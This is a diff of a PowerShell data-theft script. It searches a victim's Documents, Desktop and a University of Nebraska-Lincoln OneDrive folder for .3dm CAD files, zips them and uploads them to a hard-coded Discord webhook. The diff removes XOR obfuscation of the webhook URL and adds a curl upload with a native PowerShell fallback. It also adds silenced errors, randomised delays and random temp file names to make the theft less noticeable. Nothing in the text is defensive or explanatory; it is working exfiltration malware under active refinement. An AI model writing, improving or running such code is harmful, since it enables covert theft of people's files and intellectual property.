@@ -1,49 +1,74 @@
-# Discord webhook (XOR semi-obfuscated)
-$hookurl = "https://discord.com/api/webhooks/" + (-join ('1340911792490287104/2HeVPsiXhBDRrGWh0eMr9w95fJXriWcCwmY4C87i0cItyUIwjGZ5EP9vg-Nukk3WvkHF'.ToCharArray() | ForEach-Object { [char]([byte][char]$_ -bxor 0x33) }))
+# Discord webhook (properly formatted)
+$hookurl = "https://discord.com/api/webhooks/1340911792490287104/2HeVPsiXhBDRrGWh0eMr9w95fJXriWcCwmY4C87i0cItyUIwjGZ5EP9vg-Nukk3WvkHF"
 
-# Target only .3dm files in these locations
+# Target locations for .3dm files
 $foldersToSearch = @(
     "$env:USERPROFILE\Documents",
-    "$env:USERPROFILE\Desktop",
+    "$env:USERPROFILE\Desktop", 
     "$env:USERPROFILE\OneDrive - University of Nebraska-Lincoln"
 )
-$fileExtensions = @("*.3dm")
 
-# Zip and upload function
+function Upload-ToDiscord {
+    param($FilePath)
+    try {
+        # Proper curl formatting with escaped quotes
+        $curlCommand = "curl.exe -F `"file1=@$FilePath`" `"$hookurl`""
+        Invoke-Expression $curlCommand
+    }
+    catch {
+        # Fallback to native PowerShell if curl fails
+        try {
+            $boundary = [System.Guid]::NewGuid().ToString()
+            $headers = @{ "Content-Type" = "multipart/form-data; boundary=$boundary" }
+            $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
+            
+            $body = (
+                "--$boundary",
+                "Content-Disposition: form-data; name=`"file1`"; filename=`"$(Split-Path $FilePath -Leaf)`"",
+                "Content-Type: application/octet-stream`r`n",
+                [System.Text.Encoding]::UTF8.GetString($fileBytes),
+                "--$boundary--"
+            ) -join "`r`n"
+            
+            Invoke-RestMethod -Uri $hookurl -Method Post -Body $body -Headers $headers
+        }
+        catch { <# Silent failure #> }
+    }
+}
+
 function Exfiltrate {
     $maxZipSize = 25MB
     $currentSize = 0
     $index = 1
-    $zipPath = "$env:temp\Data$index.zip"
+    $zipPath = "$env:temp\Data$([System.Guid]::NewGuid().ToString('n')).zip"
 
     Add-Type -AssemblyName System.IO.Compression.FileSystem
     $zip = [System.IO.Compression.ZipFile]::Open($zipPath, 'Create')
 
     foreach ($folder in $foldersToSearch) {
-        $files = Get-ChildItem -Path $folder -Filter "*.3dm" -Recurse -File -ErrorAction SilentlyContinue
-        foreach ($file in $files) {
-            $fileSize = $file.Length
+        Get-ChildItem -Path $folder -Filter "*.3dm" -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
+            $fileSize = $_.Length
             if ($currentSize + $fileSize -gt $maxZipSize) {
                 $zip.Dispose()
-                curl.exe -F "file1=@$zipPath" $hookurl
-                Remove-Item $zipPath -Force
-                Start-Sleep -Milliseconds 800
+                Upload-ToDiscord -FilePath $zipPath
+                Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
+                Start-Sleep -Milliseconds (Get-Random -Minimum 500 -Maximum 1500)
                 
                 $index++
-                $zipPath = "$env:temp\Data$index.zip"
+                $zipPath = "$env:temp\Data$([System.Guid]::NewGuid().ToString('n')).zip"
                 $zip = [System.IO.Compression.ZipFile]::Open($zipPath, 'Create')
                 $currentSize = 0
             }
             
-            $entryName = $file.FullName.Substring($folder.Length + 1)
-            [void][System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zip, $file.FullName, $entryName)
+            $entryName = $_.FullName.Substring($folder.Length + 1)
+            [void][System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zip, $_.FullName, $entryName)
             $currentSize += $fileSize
         }
     }
 
-    if ((Get-Item $zipPath).Length -gt 0) {
+    if ((Test-Path $zipPath) -and ((Get-Item $zipPath).Length -gt 0) {
         $zip.Dispose()
-        curl.exe -F "file1=@$zipPath" $hookurl
+        Upload-ToDiscord -FilePath $zipPath
     }
     Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
 }
